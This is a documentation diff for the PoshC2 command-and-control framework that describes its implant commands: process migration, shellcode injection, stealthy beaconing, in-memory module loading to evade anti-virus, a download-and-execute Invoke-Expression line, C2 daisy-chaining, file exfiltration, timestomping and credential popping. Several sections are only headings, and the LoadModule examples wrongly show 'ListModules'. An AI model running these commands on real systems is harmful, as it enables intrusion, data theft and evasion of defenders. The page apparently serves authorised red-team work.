@@ -2,8 +2,275 @@
   Core Implant / Features
 ###########################
 
-.. toctree::
-   :maxdepth: 2
+Using an Implant
+####################
+The Implant-Handler window will not refresh the implant check-in times automatically, however, if you hit the [enter] key without any values in the input field it will refresh the implant window and update the last checked in times/dates. If you then wish to use one of the implants type the ID value and hit enter and this will put you into a prompt like follows ``1``::
 
-   filemanagement
-   
+	PS 1>
+
+If you want to select more than one implant, you can provide a comma seperated list ``1,2,3,4``::
+
+	PS 1,2,3>
+
+Finally, you can select ALL implants by typing ``ALL``::
+
+	PS ALL>
+
+StartAnotherImplant / S
+#########################
+Stability and redundancy is key, while we pride ourselves in the stability of PoshC2 implants it would always be in someone's best interest to maintain access when it may have taken significant time to obtain the foothold in the first instance. Born the ``StartAnotherImplant`` command and does exactly what it says in the help, it provides the user with another implant for redundancy. This command is quite long and has been aliased to a shorter form so can be ran using only ``S``. 
+
+This will by default start another "Powershell.exe" process, however, if you have migrated it will warn you before starting another implant as you may be trying to avoid using "Powershell.exe" at all because of monitoring systems checking for this execution. 
+
+.. code-block:: powershell
+
+	StartAnotherImplant
+
+.. code-block:: powershell
+
+	S
+
+
+Migrate
+###########
+Alternatively, you can inject separate shellcode
+Migrate -x64 -ProcID 444
+Migrate -x64 -ProcessPath C:\Windows\System32\cmd.exe
+Migrate -x86
+Migrate-x64 -ProcID 4444
+Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe
+Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe
+Migrate-Proxy-x86 -ProcID 4444
+Migrate-Proxy-x64 -ProcID 444
+Migrate-Daisy-x86 -Name DC1  -ProcID 444
+Migrate-Daisy-x64 -Name DC2
+
+Inject-Shellcode
+#########################################
+Inject-Shellcode -File
+
+Beacon [seconds/minutes/hours]
+#########################################
+This is a simple command, but has a very significant place in Posh C2. It provides the user with the ability to change the 'beacon' time of the implant. Beacon time is the amount of time between each call home to the C2 server. The command can take parameters in seconds (``s``), minutes (``m``) or hours (``h``). 
+
+Setting the beacon time allows the user to achieve a certain amount of 'stealth', for instance to bypass or disguise the traffic against various C2 monitoring solutions. In addition to the user setting, there is a 10% jitter applied, this creates a random +/- time so the call back is never exactly the same each beacon.
+
+.. code-block:: powershell
+
+	Beacon 60s
+
+.. code-block:: powershell
+
+	Beacon 10m
+
+.. code-block:: powershell
+
+	Beacon 2h
+
+Turtle [seconds/minutes/hours]
+##############################
+Turtle is a similar function to the Beacon command, however in this case it tells the implant to go to sleep for a period of time, or as we like to refer to it as 'turtle mode'.
+
+This allows the user to be even more stealthy, for example a user may want the implant to stop calling home for a long period of time, maybe overnight or for 12 hours. The command can take parameters in seconds (``s``), minutes (``m``) or hours (``h``). 
+
+.. code-block:: powershell
+
+	Turtle 30m
+
+.. code-block:: powershell
+
+	Turtle 12h
+
+Kill-Implant
+###############
+This is a straight forward command to tell the implant to die and no longer connect back to the Posh C2 server. This command needs to be issued when interacting with the implant, it will not kill an implant otherwise. It is worth noting that in Powershell it will by default terminate the process, however, when migrating to another process it will only stop execution as we do not want to stop the entire PID. 
+
+.. code-block:: powershell
+
+	Kill-Implant
+
+Hide-Implant
+##############
+The Hide-Implant command is a partner to the above, Kill-Implant command, the reason for this command is the situation may arise where an implant may become disconnected or stale and there is no way to interact with it to kill it. This command simply removes it from the list of implants to avoid possible confusion.
+
+Unhide-Implant
+##############
+Does the reverse of the Hide-Implant it re-adds any hidden implants into the implant list
+
+ListModules
+###############
+The ``ListModules`` command allows the user to view the PowerShell modules that reside in the modules folder, within the Posh C2 folder tree. We have provided quiet a few PowerShell modules that most of you will recognise such as Mimikatz and PowerUp, and some you will not have seen before. One of the nice features of Posh C2 is the ability for the user to create his own PowerShell modules and use them within Posh C2. Simply copy the modules you want into the modules folder and you'll be able to load them into a running implant with the 'LoadModule' command, which is discussed further on in this wiki.
+
+.. code-block:: powershell
+
+	ListModules
+
+LoadModule 
+#############
+As mentioned above, the LoadModules command allows a user to upload any PowerShell module into the memory space of the current implant, nothing touches disk, so we can evade non memory resident Anti-Virus. This will either search locally in the PoshC2 modules directory or can take a full path to a directory on the hard drive if this is outside the PoshC2 core modules folder.
+
+.. code-block:: powershell
+
+	ListModules Invoke-Mimikatz.ps1
+
+.. code-block:: powershell
+
+	ListModules C:\Temp\PS-Modules\Invoke-Mimikatz.ps1
+
+Loaded Module Externally
+########################
+To load a module directly from a webpage or github, you can use the Invoke-Expression function in Powershell to load this directly into memory if required.
+
+.. code-block:: powershell
+
+	Invoke-Expression (Get-Webclient).DownloadString("https://module.ps1")
+
+ModulesLoaded
+###############
+The ``ModulesLoaded`` command shows the user which Powershell modules has been loaded into the currently active implant, this is purely an informational command to see if you have loaded something previously.
+
+.. code-block:: powershell
+
+	ModulesLoaded
+
+CreateProxyPayload
+####################
+The ``CreateProxyPayload`` command was created to allow in implant to traverse a an authenticated proxy when the implant is running under the SYSTEM account. Under normal circumstances the SYSTEM account can't provide credentials to a proxy server and pass through, so we created the CreateProxyPayload command to allow the attacker to provide a set of valid proxy credentials within the payload and thus traverses any authenticated proxy server. We would use this technique when attempting lateral movement also.
+
+.. code-block:: powershell
+
+	CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>
+
+
+CreateNewPayload
+####################
+This ``CreateNewPayload`` payload generates a list of new implants that are setup to beacon to a different location
+
+.. code-block:: powershell
+
+	CreateNewPayload -hostname https://hostname.com -domainfrontheader <url>
+
+
+Invoke-DaisyChain
+####################
+Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)
+
+Get-Proxy
+##########
+Here we provide a command that simply reports the IP address (if any) of the proxy server that the host implant is running on. This command gets the value from the user registry hive, ``HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings``
+
+.. code-block:: powershell
+
+	Get-Proxy
+
+Unzip 
+########
+Fairly straight forward command, it provides the user the ability to 'unzip a file', given the source and destination.
+
+.. code-block:: powershell
+
+	Unzip c:\Temp\zipped-exploit.zip C:\Temp\Exploit
+
+
+Download-File
+#########################
+Simply enter the path and name of the file to download, (copy back to the attackers system).
+
+.. code-block:: powershell
+
+ 	Download-File -Source 'C:\Temp\Run Me.exe'
+
+
+Download-Files
+#########################
+Simply enter the path and name of the file to download, (copy back to the attackers system).
+
+.. code-block:: powershell
+
+ 	Download-Files 'C:\Temp\'
+
+The files will end up in the downloads folder in the same folder structure as you downloaded them. 
+
+
+Upload-File
+#########################
+
+Opposite of the above command
+
+.. code-block:: powershell
+
+ 	Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'
+
+This is not considered the be Opsec safe for obvious reasons.
+
+Web-Upload-File
+#########################
+
+Here we have the option to upload a file to a victim system but this time we allow for the file to be copied from a remote web server. Again this command is not considered Opsec safe.
+
+.. code-block:: powershell
+
+ 	Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe'
+
+
+Get-Pid
+#########
+Returns the process ID of the implant from the database. This command does not go to the implant to retrieve this information:
+
+	Get-Pid
+
+Get-System
+############
+This is not an privilege escalation checking function, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user. 
+
+Get-System-WithProxy
+#####################
+
+Get-System-WithDaisy
+#########################
+
+Get-ImplantWorkingDirectory
+#############################
+
+Posh-Delete C:\Temp\svc.exe
+#############################
+
+Get-Webpage http://intranet
+#############################
+
+EnableRDP
+############
+
+DisableRDP
+############
+
+TimeStomp 
+###########
+TimeStomp C:\Windows\System32\Service.exe "01/03/2008 12:12 pm"
+
+Get-Screenshot
+#########################
+
+Get-ScreenshotAllWindows
+#########################
+
+Get-ScreenshotMulti
+#########################
+Get-ScreenshotMulti -Timedelay 120 -Quantity 30
+
+Cred-Popper
+#########################
+
+Get-Clipboard
+#########################
+
+Get-AllFirewallRules
+#########################
+Get-AllFirewallRules C:\temp\rules.csv
+
+Get-AllServices
+#########################
+
+SocksProxy / SharpSocks
+#########################
+SharpSocks -Uri http://www.c2.com:9090 -Beacon 2000 -Insecure
